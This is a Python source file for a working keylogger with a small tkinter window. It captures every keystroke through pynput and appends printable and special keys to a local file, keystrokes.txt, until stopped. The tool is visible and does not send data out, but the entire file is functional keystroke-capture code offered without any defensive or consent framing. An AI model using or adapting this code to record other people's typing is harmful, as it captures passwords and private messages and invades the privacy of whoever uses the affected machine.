from pynput import keyboard
import tkinter as tk
from tkinter import messagebox
import threading


LOG_FILE = "keystrokes.txt"


listener = None

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key}]")


def start_keylogger():
    global listener
    if listener is None:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        status_label.config(text="Keylogger is running...")
    else:
        messagebox.showinfo("Info", "Keylogger is already running.")


def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
        status_label.config(text="Keylogger stopped.")
    else:
        messagebox.showinfo("Info", "Keylogger is not running.")


def exit_app():
    if listener is not None:
        listener.stop()
    root.destroy()


root = tk.Tk()
root.title("Keylogger")
root.geometry("300x150")


start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

status_label = tk.Label(root, text="Keylogger is not running.")
status_label.pack(pady=10)

exit_button = tk.Button(root, text="Exit", command=exit_app)
exit_button.pack(pady=10)

root.mainloop()